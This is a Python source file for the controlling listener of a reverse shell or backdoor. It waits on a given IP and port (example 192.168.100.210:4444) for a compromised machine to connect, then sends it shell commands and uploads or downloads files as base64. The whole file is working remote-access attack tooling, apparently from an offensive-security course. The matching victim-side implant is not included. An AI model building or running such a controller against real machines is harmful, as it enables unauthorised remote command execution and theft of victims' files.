#!/usr/bin/env python

import argparse
import socket
import json
import base64


'''
        To run the listener, pass the arguments as shown below:

        e.g. python listener.py -i '192.168.100.210' -p 4444
'''


class Listener:
    def __init__(self, ip, port):
        # initialize socket
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        # bind the socket to the given IP and port
        listener.bind((ip, port))
        listener.listen(0)
        print('[+] Waiting for incoming connections.')
        # accept incoming connections
        self.connection, self.address = listener.accept()
        print('[+] Got a connection from ' + str(self.address))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode('utf-8'))

    def reliable_receive(self):
        json_data = ''
        while True:
            try:
                json_data += (self.connection.recv(1024)).decode('utf-8')
                return json.loads(json_data.encode('utf-8'))
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)

        if command[0] == 'exit':
            self.connection.close()
            exit()

        return self.reliable_receive()

    def read_file(self, path):
        with open(path, 'rb') as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, 'wb') as file:
            file.write(base64.b64decode(content.encode('utf-8')))
            return '[+] Download successful.'

    def run(self):
        while True:
            command = input('>> ').split(' ')
            try:
                if command[0] == 'upload':
                    file_content = self.read_file(command[1])
                    command.append(file_content.decode('utf-8'))

                result = self.execute_remotely(command)

                if command[0] == 'download' and '[-] Error ' not in result:
                    result = self.write_file(command[1], result)
            except Exception as err:
                result = '[-] Error during command execution: ' + str(err)

            print(result)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description='Listener command line parameters.')
    parser.add_argument('-i', '--ip', required=True,
                        help='IP address')
    parser.add_argument('-p', '--port', required=True,
                        type=int, help='Port number')

    args = parser.parse_args()

    my_listener = Listener(args.ip, args.port)
    my_listener.run()
